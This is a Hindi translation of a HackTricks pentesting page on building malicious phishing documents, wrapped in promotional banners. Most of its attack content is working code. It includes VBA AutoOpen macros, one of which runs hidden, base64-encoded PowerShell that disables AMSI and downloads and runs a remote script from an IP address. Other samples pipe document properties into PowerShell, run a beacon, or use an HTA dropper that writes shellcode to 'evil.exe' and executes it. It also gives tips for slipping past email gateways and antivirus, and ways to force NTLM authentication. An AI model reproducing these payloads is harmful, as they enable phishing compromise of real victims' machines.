# फिशिंग फ़ाइलें और दस्तावेज़

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने की उपलब्धता** चाहिए? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष संग्रह [**NFTs**](https://opensea.io/collection/the-peass-family)
* प्राप्त करें [**आधिकारिक PEASS और HackTricks swag**](https://peass.creator-spring.com)
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में या मुझे **Twitter** पर **फ़ॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **अपने हैकिंग ट्रिक्स को [hacktricks रेपो](https://github.com/carlospolop/hacktricks) और [hacktricks-cloud रेपो](https://github.com/carlospolop/hacktricks-cloud) में पीआर जमा करके साझा करें।**

</details>

## ऑफिस दस्तावेज़

माइक्रोसॉफ्ट वर्ड फ़ाइल खोलने से पहले फ़ाइल डेटा मान्यता की जांच करता है। डेटा मान्यता को ऑफिसओपनएमएल स्टैंडर्ड के खिलाफ डेटा संरचना पहचान के रूप में कार्यान्वित किया जाता है। डेटा संरचना पहचान के दौरान कोई त्रुटि होती है तो विश्लेषित की जा रही फ़ाइल नहीं खोली जाएगी।

आमतौर पर, मैक्रोस का उपयोग करने वाली वर्ड फ़ाइलें `.docm` एक्सटेंशन का उपयोग करती हैं। हालांकि, फ़ाइल एक्सटेंशन बदलकर फ़ाइल का नाम बदला जा सकता है और फिर भी उनकी मैक्रो क्रियान्वयन क्षमताएं बरकरार रखी जा सकती हैं।\
उदाहरण के लिए, एक RTF फ़ाइल मैक्रो का समर्थन नहीं करती है, डिज़ाइन के अनुसार, लेकिन RTF के रूप में नामित एक DOCM फ़ाइल को माइक्रोसॉफ्ट वर्ड द्वारा संभाला जाएगा और मैक्रो क्रियान्वयन क्षमता होगी।\
माइक्रोसॉफ्ट ऑफिस स्यूट (एक्सेल, पावरपॉइंट आदि) के सभी सॉफ़्टवेयर पर एक ही आंतरिक और यांत्रिक तंत्र लागू होता है।

आप निम्नलिखित कमांड का उपयोग कर सकते हैं ताकि आप जांच सकें कि कौन से एक्सटेंशन किसी ऑफिस प्रोग्राम द्वारा कार्यान्वित किए जाएंगे:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX फ़ाइलें एक दूरस्थ टेम्पलेट (फ़ाइल - विकल्प - एड-इन - प्रबंधित: टेम्पलेट - जाएं) का संदर्भ देती हैं जिसमें मैक्रोज़ शामिल हो सकते हैं और "चला" सकते हैं।

### बाहरी छवि लोड

जाएं: _इंजेक्ट --> तत्व तत्व --> क्षेत्र_\
_**श्रेणियाँ**: लिंक और संदर्भ, **फ़ाइल्ड नाम**: includePicture, और **फ़ाइलनाम या URL**:_ http://\<ip>/whatever

![](<../../.gitbook/assets/image (316).png>)

### मैक्रोज़ बैकडोर

दस्तावेज़ से विचित्र कोड चलाने के लिए मैक्रोज़ का उपयोग किया जा सकता है।

#### ऑटोलोड फ़ंक्शन

जितने अधिक सामान्य होंगे, उतने ही अधिक संभावित है कि AV उन्हें पहचानेंगे।

* AutoOpen()
* Document\_Open()

#### मैक्रोज़ कोड उदाहरण
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### मैटाडेटा को मैन्युअल रूप से हटाएं

**फ़ाइल > जानकारी > दस्तावेज़ की जांच करें > दस्तावेज़ की जांच करें** पर जाएं, जिससे दस्तावेज़ की जांचकर्ता खुलेगा। **जांच करें** पर क्लिक करें और फिर **दस्तावेज़ के गुण और व्यक्तिगत जानकारी** के पास **सभी हटाएं** पर क्लिक करें।

#### डॉक एक्सटेंशन

समाप्त होने पर, **दस्तावेज़ के प्रकार का चयन करें** ड्रॉपडाउन, **`.docx`** से **Word 97-2003 `.doc`** में प्रारूप बदलें।\
इसे इसलिए करें क्योंकि आप **`.docx`** में मैक्रो सहेज नहीं सकते हैं और मैक्रो-सक्षम **`.docm`** एक्सटेंशन के आस-पास एक **संकेत** है (जैसे कि थंबनेल आइकन में एक विशाल `!` होता है और कुछ वेब/ईमेल गेटवे उन्हें पूरी तरह से अवरुद्ध कर देते हैं)। इसलिए, यह **पुरानी `.doc` एक्सटेंशन सबसे अच्छा समझौता है**।

#### क्षतिपूर्ण मैक्रो जेनरेटर

* MacOS
* [**macphish**](https://github.com/cldrn/macphish)
* [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## HTA फ़ाइलें

एक HTA एक प्रोप्राइटरी Windows प्रोग्राम है जिसका **स्रोत कोड HTML और एक या एक से अधिक स्क्रिप्टिंग भाषाओं** से मिलकर बना होता है जिसे Internet Explorer (VBScript और JScript) समर्थित करता है। HTML का उपयोग उपयोगकर्ता इंटरफ़ेस और कार्यक्रम तार्किक के लिए स्क्रिप्टिंग भाषा उत्पन्न करने के लिए किया जाता है। एक HTA ब्राउज़र की सुरक्षा मॉडल की प्रतिबंधों के बिना चलाया जाता है, इसलिए यह "पूरी तरह से विश्वसनीय" एक्सेस के रूप में चलता है।

HTA को **`mshta.exe`** का उपयोग करके निष्पादित किया जाता है, जो सामान्यतः **Internet Explorer** के साथ **स्थापित** होता है, जिसके कारण **`mshta` IE पर आधारित होता है**। इसलिए अगर यह अनइंस्टॉल कर दिया गया है, तो HTA निष्पादित नहीं हो सकेंगे।
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## NTLM प्रमाणीकरण को बलवान बनाना

**दूरस्थ** NTLM प्रमाणीकरण को बलवान बनाने के कई तरीके हैं, उदाहरण के लिए, आप ईमेल या HTML में **अदृश्य छवियों** को जोड़ सकते हैं जिन्हें उपयोगकर्ता एक्सेस करेगा (क्या HTTP MitM के माध्यम से भी?). या पीडीएफ फ़ाइलों के पते भेजकर पीडीएफ खोलने के लिए प्रमाणीकरण को **ट्रिगर** करने वाली **फ़ोल्डर** की **पता** दें सकते हैं।

**निम्नलिखित पृष्ठों में इन विचारों की जांच करें और अधिक:**

{% content-ref url="../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md)
{% endcontent-ref %}

{% content-ref url="../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md" %}
[places-to-steal-ntlm-creds.md](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md)
{% endcontent-ref %}

### NTLM रिले

याद रखें कि आप न केवल हैश या प्रमाणीकरण चोरी कर सकते हैं, बल्कि **NTLM रिले हमले** भी कर सकते हैं:

* [**NTLM रिले हमले**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
* [**AD CS ESC8 (NTLM रिले से प्रमाणपत्र)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप किसी **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की अनुमति चाहिए? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष [**NFT**](https://opensea.io/collection/the-peass-family) संग्रह
* प्राप्त करें [**आधिकारिक PEASS और HackTricks swag**](https://peass.creator-spring.com)
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या मुझे **ट्विटर** पर **फ़ॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **अपने हैकिंग ट्रिक्स को [hacktricks रेपो](https://github.com/carlospolop/hacktricks) और [hacktricks-cloud रेपो](https://github.com/carlospolop/hacktricks-cloud) में पीआर जमा करके साझा करें।**

</details>
